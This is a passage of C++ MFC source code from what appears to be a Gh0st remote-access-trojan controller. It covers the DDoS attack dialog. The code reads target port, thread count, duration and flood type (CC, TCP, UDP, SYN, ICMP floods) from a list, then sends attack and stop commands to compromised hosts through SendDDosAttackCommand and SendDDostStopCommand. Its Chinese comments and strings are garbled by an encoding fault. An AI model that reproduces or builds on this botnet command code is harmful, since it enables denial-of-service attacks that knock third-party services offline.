				CHAR Param[100]={NULL};
				//��ȡ�˿�
				m_TargetList.GetItemText(i,1,Param,100);
				m_Attack.AttackPort = atoi(Param);

				//��ȡ�߳���
				m_TargetList.GetItemText(i,3,Param,100);
				m_Attack.AttackThread = atoi(Param);

				//��ȡʱ��
				m_TargetList.GetItemText(i,4,Param,100);
				m_Attack.AttackTime = atoi(Param);

				//��������..
				CString szType;
				szType = m_TargetList.GetItemText(i,5);

				if(szType == "��վ: ����CC")
				{
					m_Attack.AttackType = ATTACK_CCFLOOD;
					//����HTTP�����..
					FilterCCString(m_Attack.Target,m_Attack,m_Attack.AttackPort);
				}
				if(szType == "��վ: ģ�� IE")
					m_Attack.AttackType = ATTACK_IMITATEIE;
		
				if(szType == "��վ: �ֻ�CC")
				{
					m_Attack.AttackType = ATTACK_LOOPCC;
					FilterCCString(m_Attack.Target,m_Attack,m_Attack.AttackPort);

					//�ֽ����...
					m_TargetList.GetItemText(i,6,Param,100);
					
					char *Point=strstr(Param,"-");
					char temp[10]={NULL};
					strncpy(temp,Param,strlen(Param)-strlen(Point));
					Point++;

					m_Attack.ExtendData1 = atoi(temp);
					m_Attack.ExtendData2 = atoi(Point);

				}
				if(szType =="����: TCP FLOOD")
					m_Attack.AttackType = ATTACK_TCPFLOOD;
				if(szType == "����: UDP FLOOD")
					m_Attack.AttackType = ATTACK_UDPFLOOD;
				if(szType == "������: SYN FLOOD")
					m_Attack.AttackType = ATTACK_SYNFLOOD;
				if(szType == "������: ICMP FLOOD")
					m_Attack.AttackType = ATTACK_ICMPFLOOD;
				if(szType == "����: ����ģʽ")
					m_Attack.AttackType = ATTACK_BRAINPOWER;

				//��ȡ��������..
				CString szHost = m_TargetList.GetItemText(i,2);
				INT HostNums=-1;
				if(szHost != "ѡ������")
					HostNums = atoi(szHost.GetBuffer(0));

				//��ȡ�����������Ƿ��Զ�����
				BOOL Auto=FALSE;
				CString szAuto = m_TargetList.GetItemText(i,7);
				if(szAuto == "��")
					Auto = TRUE;

				//��ȡ����ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i,9);
				Task = atoi(szTask.GetBuffer(0));

				if(ViewPoint == NULL || Point == NULL)
				{
					MessageBox("��ʼ��ʧ�� ���������!");
					return;
				}
				
				CGh0stView *m_Point=(CGh0stView *)ViewPoint;
				WORD Ret=m_Point->SendDDosAttackCommand(&m_Attack,HostNums,Auto,Task);
				
				CDDOSAttackDlg *m_AttackPoint =(CDDOSAttackDlg *)Point;
				CString szShow;
				szShow.Format("�ɹ����� %d ����ʼ���� ����ID:%d",Ret,Task);
				m_AttackPoint->StatusTextOut(0,szShow);

				m_TargetList.SetItemText(i,8,"������");
		   }
		}
	}
}

void CWebAttackDlg::OnStop() 
{
	// TODO: Add your command handler code here
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i,8);
			if(str=="����")
			{
				MessageBox("���� Ŀ�겢δ��ʼ �޷�ֹͣ!","��ʾ",MB_OK|MB_ICONINFORMATION);
				return;
			}
			else
			{
				CGh0stView *m_Point=(CGh0stView *)ViewPoint;

				//��ȡ����ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i,9);
				Task = atoi(szTask.GetBuffer(0));

				WORD Ret=m_Point->SendDDostStopCommand(Task);
	

				CDDOSAttackDlg *m_AttackPoint =(CDDOSAttackDlg *)Point;
				CString szShow;
				szShow.Format("�ɹ����� %d ��ֹͣ���� ����ID:%d",Ret,Task);
				m_AttackPoint->StatusTextOut(0,szShow);

				m_TargetList.SetItemText(i,8,"����");
			}
		}
		
	}
}



void CWebAttackDlg::OnDeleteList() 
{
	// TODO: Add your command handler code here
	for (int i=0;i<m_TargetList.GetItemCount();i++)
	{
		if(LVIS_SELECTED==m_TargetList.GetItemState(i,LVIS_SELECTED))
		{
		   CString str = m_TargetList.GetItemText(i,8);
		   if(str=="������")
		   {
				MessageBox("���� Ŀ���Ѿ�������! �޷�ɾ��!����ֹͣ��ɾ��!","��ʾ",MB_OK|MB_ICONINFORMATION);
				return;
		   }
			m_TargetList.DeleteItem(i);
		}
	}
}
